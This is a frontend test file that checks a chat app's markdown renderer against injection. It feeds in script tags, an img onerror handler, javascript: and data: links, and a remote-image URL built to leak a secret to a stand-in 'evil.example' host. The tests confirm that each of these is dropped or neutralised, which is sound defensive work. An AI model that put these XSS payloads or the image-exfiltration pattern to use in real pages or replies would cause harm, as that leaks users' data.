import { render, screen } from '@testing-library/react';
import userEvent from '@testing-library/user-event';
import { describe, expect, it } from 'vitest';
import { AssistantText, Markdown, MAX_FORMATTED_CHARS, PlainText, safeUrl } from '../src/lib/markdown';

describe('markdown safety', () => {
  it('drops raw HTML and scripts', () => {
    const { container } = render(
      <Markdown
        text={
          'Hi <script>alert(1)</script> <b>bold</b> <img src="x" onerror="alert(1)">\n\n<iframe src="https://evil.example"></iframe>'
        }
      />,
    );
    expect(container.querySelector('script')).toBeNull();
    expect(container.querySelector('b')).toBeNull();
    expect(container.querySelector('iframe')).toBeNull();
    expect(container.querySelector('img')).toBeNull();
    expect(container.innerHTML).not.toContain('onerror');
  });

  it.each([
    'javascript:alert(1)',
    'JaVaScRiPt:alert(1)',
    'data:text/html,<script>alert(1)</script>',
    'vbscript:x',
    '/relative',
  ])('neutralises %s links', (href) => {
    const { container } = render(<Markdown text={`[click](${href})`} />);
    expect(container.querySelector('a')).toBeNull();
    expect(screen.getByText('click')).toBeInTheDocument();
  });

  it('external links open safely with the full URL in the title', () => {
    render(<Markdown text={'[docs](https://example.com/a?b=1)'} />);
    const link = screen.getByRole('link', { name: 'docs' });
    expect(link).toHaveAttribute('href', 'https://example.com/a?b=1');
    expect(link).toHaveAttribute('target', '_blank');
    expect(link).toHaveAttribute('rel', 'noopener noreferrer nofollow');
    expect(link).toHaveAttribute('title', 'https://example.com/a?b=1');
  });

  it('keeps mailto and in-page anchors', () => {
    render(<Markdown text={'[mail](mailto:me@example.com) [top](#top)'} />);
    expect(screen.getByRole('link', { name: 'mail' })).toHaveAttribute('href', 'mailto:me@example.com');
    expect(screen.getByRole('link', { name: 'top' })).not.toHaveAttribute('target');
  });

  it('never loads remote images: they become text links', () => {
    const { container } = render(<Markdown text={'![secret](https://evil.example/leak?d=SECRET)'} />);
    expect(container.querySelector('img')).toBeNull();
    const link = screen.getByRole('link');
    expect(link).toHaveTextContent('[image: secret](https://evil.example/leak?d=SECRET)');
    expect(link).toHaveAttribute('rel', 'noopener noreferrer nofollow');
  });

  it('data: images are not rendered either', () => {
    const { container } = render(<Markdown text={'![pix](data:image/png;base64,AAAA)'} />);
    expect(container.querySelector('img')).toBeNull();
    expect(container.querySelector('a')).toBeNull();
    expect(container).toHaveTextContent('[image: pix]');
  });

  it('renders GFM tables in a scroll container and code blocks with a copy button', async () => {
    const { container } = render(
      <Markdown text={'| a | b |\n|---|---|\n| 1 | 2 |\n\n```\ncode here\n```'} />,
    );
    expect(container.querySelector('.overflow-x-auto > table')).not.toBeNull();
    const copy = screen.getByRole('button', { name: 'Copy' });
    // navigator.clipboard is undefined in the suite: the fallback reports and selects instead.
    await userEvent.click(copy);
    expect(screen.getByRole('button', { name: /Copied|Selected/ })).toBeInTheDocument();
  });

  it('very large messages start as plain text with a toggle', async () => {
    const big = '**bold** ' + 'x'.repeat(MAX_FORMATTED_CHARS);
    const { container } = render(<AssistantText text={big} />);
    expect(container.querySelector('strong')).toBeNull();
    await userEvent.click(screen.getByRole('button', { name: 'Render formatting' }));
    expect(container.querySelector('strong')).not.toBeNull();
  });

  it('plain text renders markup literally', () => {
    const { container } = render(<PlainText text={'<b>hi</b>\n**not bold**'} />);
    expect(container.querySelector('b')).toBeNull();
    expect(container).toHaveTextContent('<b>hi</b> **not bold**');
  });

  it('safeUrl allows only http(s), mailto and anchors', () => {
    expect(safeUrl('https://a.example')).toBe('https://a.example');
    expect(safeUrl('#x')).toBe('#x');
    expect(safeUrl('javascript:alert(1)')).toBe('');
    expect(safeUrl(' data:text/html,x')).toBe('');
  });
});
